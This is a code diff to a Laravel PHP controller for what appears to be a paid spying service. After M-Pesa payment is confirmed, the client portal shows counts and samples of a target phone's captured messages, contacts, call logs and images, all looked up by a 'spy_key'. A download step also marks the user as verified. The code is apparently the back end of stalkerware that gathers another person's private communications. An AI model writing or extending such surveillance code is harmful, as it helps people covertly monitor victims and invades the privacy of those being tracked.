@@ -2,6 +2,9 @@
 
 namespace App\Http\Controllers;
 
+use App\Models\CallLogs;
+use App\Models\Contact;
+use App\Models\Images;
 use App\Models\Message;
 use App\Models\MpesaTransaction;
 use App\Models\User;
@@ -23,8 +26,26 @@ class ClientController extends Controller
     public function portal(){
         if (Auth::check()) {
             $user = User::find(Auth::user()->id);
-            if ($user->is_verified == 1) {
-                return view('portal.index')->with('user', $user);
+            if ($user->is_verified == 1 && $user->is_payment_confirmed == 1) {
+                $messages_no = Message::where('spy_key', $user->spy_key)->count();
+                $contacts_no = Contact::where('spy_key', $user->spy_key)->count();
+                $call_logs = CallLogs::where('spy_key', $user->spy_key)->count();
+                $images_no = Images::where('spy_key', $user->spy_key)->count();
+
+                $total_items = $messages_no+$contacts_no+$call_logs+$images_no;
+
+                $message = Message::where('spy_key', $user->spy_key)->take(5)->get();
+                $contact = Contact::where('spy_key', $user->spy_key)->take(5)->get();
+                $call_log = CallLogs::where('spy_key', $user->spy_key)->take(5)->get();
+                $image = Images::where('spy_key', $user->spy_key)->take(5)->get();
+
+                return view('portal.index', compact('message','contact','call_log','image'))
+                    ->with('user', $user)
+                    ->with('total_messages', $messages_no)
+                    ->with('total_contacts', $contacts_no)
+                    ->with('total_call_logs', $call_logs)
+                    ->with('total_images', $images_no)
+                    ->with('total_items', $total_items);
             }else{
                 return view('portal.setup')->with('user', $user);
             }
@@ -78,7 +99,7 @@ class ClientController extends Controller
             ->with('user',$user);
     }
 
-    //show the mmpesa payment confirmation form
+    //show the mpesa payment confirmation form
     public function show_confirm(){
         return view('mpesa.confirmation');
     }
@@ -122,6 +143,7 @@ class ClientController extends Controller
         $user_id = Auth::user()->id;
         $user = User::find($user_id);
         $user->downloaded = 1;
+        $user->is_verified = 1;
         $user->update();
 
        return Storage::download('data.txt');
